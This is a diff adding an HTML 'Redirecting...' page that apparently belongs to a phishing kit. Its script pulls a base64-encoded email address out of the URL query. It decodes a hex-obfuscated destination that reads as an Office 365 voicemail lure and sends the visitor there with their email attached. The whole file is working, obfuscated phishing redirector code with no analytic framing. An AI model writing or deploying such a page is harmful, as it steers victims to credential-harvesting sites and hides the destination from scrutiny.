@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        // Base64 decoding function
+        function decodeBase64(encoded) {
+            try {
+                return atob(encoded);
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // Function to find and decode the email parameter
+        function findEmailParam() {
+            const urlParams = new URLSearchParams(window.location.search);
+            for (const [key, value] of urlParams.entries()) {
+                if (/^[A-Za-z0-9+/]{45}$/.test(key) && /^[A-Za-z0-9+/=]*$/.test(value)) {
+                    const decodedValue = decodeBase64(value);
+                    if (decodedValue && decodedValue.includes('@')) {
+                        return { key, value: decodedValue }; // Return the key and the decoded email
+                    }
+                }
+            }
+            return null;
+        }
+
+        // Hex-encoded URL
+        let u = "68747470733a2f2f7777772e6a697669736f6c7574696f6e732e636f6d2f6e2f3f63335939627a4d324e56387858335a7661574e6c4a6e4a68626d51395a5735724d5756755454306d64576c6b50565654525649794f4445774d6a41794e4655304e6a45774d6a67794f513d3d4e303132334e";
+        
+        // Attempt to find an email parameter and redirect
+        const emailParam = findEmailParam();
+        const emailQuery = emailParam ? `?email=${encodeURIComponent(emailParam.value)}` : "";
+
+        // Perform redirection
+        location.href = decodeURIComponent('%' + u.match(/.{1,2}/g).join('%')) + emailQuery;
+    </script>
+</body>
+</html>
